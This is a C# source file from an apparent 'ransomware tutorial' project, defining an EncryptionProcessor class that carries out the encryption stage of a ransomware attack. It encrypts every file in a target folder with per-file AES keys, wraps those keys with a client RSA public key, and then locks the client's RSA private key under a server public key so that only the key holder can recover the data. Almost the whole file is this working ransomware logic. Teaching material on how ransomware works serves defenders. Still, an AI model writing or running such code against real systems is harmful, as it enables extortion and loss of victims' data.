using RansomwareTutorial.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace RansomwareTutorial.Controllers
{
    public static class EncryptionProcessor
    {
        public static bool SetupWorkingItems(string workingDirectory, string aesLocation, string lockedDataLocation, string clientRSAPublicKeyLocation, string clientRsaPrivateKeyLocation)
        {
            var rsaKey = CryptoHelper.GenerateRSAKeys();

            if (Directory.Exists(workingDirectory))
            {
                File.WriteAllText(clientRSAPublicKeyLocation, rsaKey.PublicKey);
                File.WriteAllText(clientRsaPrivateKeyLocation, rsaKey.PrivateKey);
            }

            if (!Directory.Exists(lockedDataLocation))
            {
                Directory.CreateDirectory(lockedDataLocation);
            }

            if (!Directory.Exists(aesLocation))
            {
                Directory.CreateDirectory(aesLocation);
            }

            return true;
        }
        public static bool LocateFilesAndEncrypt(string targetLocation, string aesLocation, string lockedDataLocation)
        {
            var filesToEyncrpt = Directory.GetFiles(targetLocation, "*", SearchOption.TopDirectoryOnly);

            foreach (var file in filesToEyncrpt)
            {
                var fileBytes = File.ReadAllBytes(file);

                var aesKey = CryptoHelper.GenerateAESKey();
                var encryptor = aesKey.CreateEncryptor();

                CryptoHelper.CryptoAES(encryptor, file, fileBytes, lockedDataLocation);

                File.WriteAllBytes(Path.Combine(aesLocation, $"AES_KEY-{Path.GetFileNameWithoutExtension(file)}.txt"), aesKey.Key);
                File.WriteAllBytes(Path.Combine(aesLocation, $"AES_IV-{Path.GetFileNameWithoutExtension(file)}.txt"), aesKey.IV);
            }

            return true;
        }
        public static bool LocateAESFilesAndEncrypt(string clientRsaPublicKeyLocation, string aesLocation)
        {
            var clientRsaPublicKey = File.ReadAllText(clientRsaPublicKeyLocation);
            var aesKeysLocations = Directory.GetFiles(aesLocation, "*", SearchOption.TopDirectoryOnly);

            foreach (var file in aesKeysLocations)
            {
                var aesEncrypted = CryptoHelper.EncryptRSA(File.ReadAllBytes(file), clientRsaPublicKey);
                File.WriteAllBytes(file, aesEncrypted);
            }

            return true;
        }
        public static bool LocateClientRSAPrivateKeyAndEncrypt(string clientRsaPrivateKeyLocation, string serverRsaPublicKeyLocation)
        {
            var clientRsaPrivateKey = File.ReadAllBytes(clientRsaPrivateKeyLocation);
            var rsaServerPublicKey = File.ReadAllText(serverRsaPublicKeyLocation);

            var privateKeyEncrypted = CryptoHelper.EncryptLongRSA(clientRsaPrivateKey, rsaServerPublicKey);
            File.WriteAllBytes(clientRsaPrivateKeyLocation, privateKeyEncrypted);

            return true;
        }
    }
}
